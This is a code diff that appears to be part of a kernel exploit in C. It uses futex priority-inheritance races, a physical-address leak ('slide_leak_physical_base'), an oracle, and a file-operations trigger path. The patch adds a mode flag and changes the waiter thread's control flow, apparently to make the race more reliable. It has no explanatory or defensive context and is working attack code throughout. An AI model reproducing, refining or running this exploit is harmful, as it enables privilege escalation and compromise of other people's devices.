@@ -146,6 +146,7 @@ static atomic_int slide_route_done;
 #if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
 static atomic_int slide_route_stop;
 #endif
+static int slide_fops_mode;
 static atomic_int slide_waiter_tid;
 static atomic_int slide_consume_calls;
 static atomic_int slide_consume_go;
@@ -897,8 +898,9 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
     return NULL;
   }
   atomic_store(&slide_waiter_ok, 1);
-  while (!atomic_load(&slide_deadlock_seen)) {
-    __asm__ volatile("yield" ::: "memory");
+  if (!atomic_load(&slide_deadlock_seen)) {
+    atomic_store(&slide_route_done, 1);
+    return NULL;
   }
   if (futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
     pr_error("slide waiter unlock chain errno=%d\n", errno);
@@ -907,6 +909,16 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   }
   while (!atomic_load(&slide_owner_acquired)) {
     __asm__ volatile("yield" ::: "memory");
+  }
+
+  if (slide_fops_mode) {
+    atomic_store(&slide_route_done, 1);
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
+    while (!atomic_load(&slide_route_stop)) {
+      usleep(10000);
+    }
+#endif
+    return NULL;
   }
 
   slide_pselect_stack_copy();
@@ -1235,6 +1247,7 @@ static int slide_restore_physical_oracle(void) {
 
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 static int app_trigger_fops_slide_slot(size_t slot) {
+  slide_fops_mode = 1;
   static size_t delay_index;
   static const int delays[] = {
     70000, 60000, 80000, 40000, 90000, 50000,
@@ -1303,6 +1316,7 @@ int app_trigger_fops_oracle_slot(size_t slot) {
 #endif
 #else
 int app_trigger_fops_slide_route(void) {
+  slide_fops_mode = 1;
   static size_t delay_index;
   static const int delays[] = {
     70000, 60000, 80000, 40000, 90000, 50000,
@@ -1349,6 +1363,7 @@ int app_trigger_fops_slide_route(void) {
 #endif
 
 static int slide_leak_physical_base(void) {
+  slide_fops_mode = 0;
   size_t started = gettime_ns();
 #if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
   uint64_t tracefs_base = 0;
